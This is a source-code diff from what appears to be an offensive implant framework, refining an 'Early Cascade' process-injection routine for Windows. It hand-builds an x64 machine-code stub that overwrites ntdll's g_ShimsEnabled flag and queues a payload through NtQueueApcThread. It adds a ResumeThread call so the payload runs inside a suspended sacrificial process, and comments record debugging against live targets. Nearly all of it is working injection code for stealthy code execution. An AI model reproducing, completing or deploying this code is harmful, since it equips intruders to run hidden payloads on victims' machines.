@@ -154,45 +154,51 @@ static BOOL ec_locate(EC_TARGETS * out)
 
 static void ec_build_stub(unsigned char * stub, unsigned char * payload,
                           unsigned char * shimsEnabledInTarget,
-                          unsigned char * shimsEnabledSelfForCalc,
-                          void * pNtQueueApcThread)
+                          void * pNtQueueApcThread, void * lpParameter)
 {
 	memset(stub, 0xCC, EC_STUB_SIZE);
-	/* g_ShimsEnabled lives in ntdll (.data) which a heap stub CANNOT reach
-	 * with a rip-rel disp32 - take the absolute address in a register:
-	 *   48 B8 <imm64 shims>   mov rax, g_ShimsEnabled
-	 *   C6 00 00              mov byte [rax], 0
-	 * (live forensics 2026-11-11: rip-rel produced a bogus heap VA and the
-	 *  stub hung the loader in LdrpSendPostSnapNotifications) */
-	stub[0] = 0x48; stub[1] = 0xB8;
-	*(unsigned long long *)(stub + 2) = (unsigned long long)(size_t)shimsEnabledInTarget;
-	stub[10] = 0xC6; stub[11] = 0x00; stub[12] = 0x00;
-	/* mov rcx, payload (ApcRoutine is the 2nd arg = RDX; keep payload in RCX
-	 * and copy below) */
-	stub[13] = 0x48; stub[14] = 0xB9;
-	*(unsigned long long *)(stub + 15) = (unsigned long long)(size_t)payload;
-	/* mov rdx, rcx */
-	stub[23] = 0x48; stub[24] = 0x89; stub[25] = 0xCA;
-	/* xor r8, r8 / xor r9, r9 */
-	stub[26] = 0x4D; stub[27] = 0x31; stub[28] = 0xC0;
-	stub[29] = 0x4D; stub[30] = 0x31; stub[31] = 0xC9;
-	/* sub rsp, 0x28 (keeps 16-byte alignment: entry rsp%16==8, call needs 8) */
-	stub[32] = 0x48; stub[33] = 0x83; stub[34] = 0xEC; stub[35] = 0x28;
-	/* mov qword [rsp], 0 / [rsp+8], 0 */
-	stub[36] = 0x48; stub[37] = 0xC7; stub[38] = 0x04; stub[39] = 0x24;
-	*(int *)(stub + 40) = 0;
-	stub[44] = 0x48; stub[45] = 0xC7; stub[46] = 0x44; stub[47] = 0x24; stub[48] = 0x08;
-	*(int *)(stub + 49) = 0;
-	/* NtQueueApcThread(ThreadHandle=-2 current, ...) - first arg is the
-	 * CURRENT THREAD: mov rcx, -2 */
-	stub[53] = 0x48; stub[54] = 0xC7; stub[55] = 0xC1; *(int *)(stub + 56) = -2;
-	/* mov rax, NtQueueApcThread */
-	stub[60] = 0x48; stub[61] = 0xB8;
-	*(unsigned long long *)(stub + 62) = (unsigned long long)(size_t)pNtQueueApcThread;
-	/* call rax / ret */
-	stub[70] = 0xFF; stub[71] = 0xD0;
-	stub[72] = 0xC3;
-	(void)shimsEnabledSelfForCalc;
+	/* stub v3 (live-forensics iteration 2026-11-11):
+	 *  - g_ShimsEnabled via ABSOLUTE address (rip-rel disp32 cannot span
+	 *    heap->ntdll; v1 hung the loader on a bogus VA)
+	 *  - NtQueueApcThread(ThreadHandle=-2, ApcRoutine=payload,
+	 *    ApcArgument1=parameter, 0, 0): the APC dispatcher calls the routine
+	 *    as (arg1->RCX, arg2, arg3) which matches the ThreadProc(LPVOID)
+	 *    shape of the injected loader entry - v2 zeroed arg1 and the payload
+	 *    ran with NULL parameters (DllMain got lpReserved=NULL -> crash)
+	 *  - [rsp+0x20]=0 for the 5th arg home (v2 left stack garbage there)
+	 *  - sub rsp,0x28 keeps 16-byte alignment at the call
+	 * Layout (fixed offsets):
+	 *  00: 48 B8 <shims64>      mov rax, g_ShimsEnabled
+	 *  0A: C6 00 00             mov byte [rax], 0
+	 *  0D: 49 B8 <param64>      mov r8, parameter
+	 *  17: 48 B8 <payload64>    mov rax, payload
+	 *  21: 48 89 C2             mov rdx, rax
+	 *  24: 4D 31 C9             xor r9, r9
+	 *  27: 48 83 EC 28          sub rsp, 28h
+	 *  2B: 48 C7 44 24 20 0*4   mov qword [rsp+20h], 0
+	 *  33: 48 C7 C1 FEFFFFFF    mov rcx, -2
+	 *  3A: 48 B8 <ntqapc64>     mov rax, NtQueueApcThread
+	 *  44: FF D0                call rax
+	 *  46: C3                   ret
+	 */
+	stub[0x00] = 0x48; stub[0x01] = 0xB8;
+	*(unsigned long long *)(stub + 0x02) = (unsigned long long)(size_t)shimsEnabledInTarget;
+	stub[0x0A] = 0xC6; stub[0x0B] = 0x00; stub[0x0C] = 0x00;
+	stub[0x0D] = 0x49; stub[0x0E] = 0xB8;
+	*(unsigned long long *)(stub + 0x0F) = (unsigned long long)(size_t)lpParameter;
+	stub[0x17] = 0x48; stub[0x18] = 0xB8;
+	*(unsigned long long *)(stub + 0x19) = (unsigned long long)(size_t)payload;
+	stub[0x21] = 0x48; stub[0x22] = 0x89; stub[0x23] = 0xC2;
+	stub[0x24] = 0x4D; stub[0x25] = 0x31; stub[0x26] = 0xC9;
+	stub[0x27] = 0x48; stub[0x28] = 0x83; stub[0x29] = 0xEC; stub[0x2A] = 0x28;
+	stub[0x2B] = 0x48; stub[0x2C] = 0xC7; stub[0x2D] = 0x44; stub[0x2E] = 0x24; stub[0x2F] = 0x20;
+	*(int *)(stub + 0x30) = 0;
+	stub[0x33] = 0x48; stub[0x34] = 0xC7; stub[0x35] = 0xC1;
+	*(int *)(stub + 0x36) = -2;
+	stub[0x3A] = 0x48; stub[0x3B] = 0xB8;
+	*(unsigned long long *)(stub + 0x3C) = (unsigned long long)(size_t)pNtQueueApcThread;
+	stub[0x44] = 0xFF; stub[0x45] = 0xD0;
+	stub[0x46] = 0xC3;
 }
 
 BOOL inject_via_earlycascade(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter)
@@ -206,14 +212,11 @@ BOOL inject_via_earlycascade(INJECTCONTEXT * context, LPVOID lpStartAddress, LPV
 	unsigned char * remoteStub = NULL;
 	SIZE_T got = 0;
 	unsigned char stub[EC_STUB_SIZE];
-	unsigned char * siteForCalc;
 	void * pNtQueueApcThread;
 	BOOL x64target = context->sameArch && context->targetArch == INJECT_ARCH_X64;
 
-	(void)lpParameter;
-
-	if (!context->isSuspended) {
-		spawn_log("ec: target not suspended - decline", 0x7fffffff);
+	if (!context->isSuspended || context->hThread == NULL) {
+		spawn_log("ec: fork&run only (suspended + thread handle) - decline", 0x7fffffff);
 		return FALSE;
 	}
 	if (!x64target) {
@@ -251,8 +254,7 @@ BOOL inject_via_earlycascade(INJECTCONTEXT * context, LPVOID lpStartAddress, LPV
 		return FALSE;
 	}
 
-	siteForCalc = remoteStub; /* rip of the mov's next insn = remoteStub+6 */
-	ec_build_stub(stub, (unsigned char *)lpStartAddress, shimsT, siteForCalc, pNtQueueApcThread);
+	ec_build_stub(stub, (unsigned char *)lpStartAddress, shimsT, pNtQueueApcThread, lpParameter);
 
 	if (!beacon_WriteProcessMemory(context->hProcess, remoteStub, stub, EC_STUB_SIZE, &got) || got != EC_STUB_SIZE) {
 		spawn_log("ec: stub write failed gle=", (long)GetLastError());
@@ -305,5 +307,20 @@ BOOL inject_via_earlycascade(INJECTCONTEXT * context, LPVOID lpStartAddress, LPV
 	}
 
 	spawn_log("ec: armed stub=", (long)(long long)(size_t)remoteStub);
+
+	/* fork&run contract (Outflank step 4): arm, then KICK the primary
+	 * thread - LdrInitializeThunk runs, the shim callback fires the stub,
+	 * the stub queues the payload APC, and NtTestAlert at the end of init
+	 * drains it. Without this resume the armed patsy just sits suspended
+	 * forever (v2 live: 'ec: armed' then nothing). */
+	if (context->hThread == NULL) {
+		spawn_log("ec: no primary thread handle - decline", 0x7fffffff);
+		return FALSE;
+	}
+	if (ResumeThread(context->hThread) == (DWORD)-1) {
+		spawn_log("ec: ResumeThread failed gle=", (long)GetLastError());
+		return FALSE;
+	}
+	spawn_log("ec: resumed primary thread", 0x7fffffff);
 	return TRUE;
 }
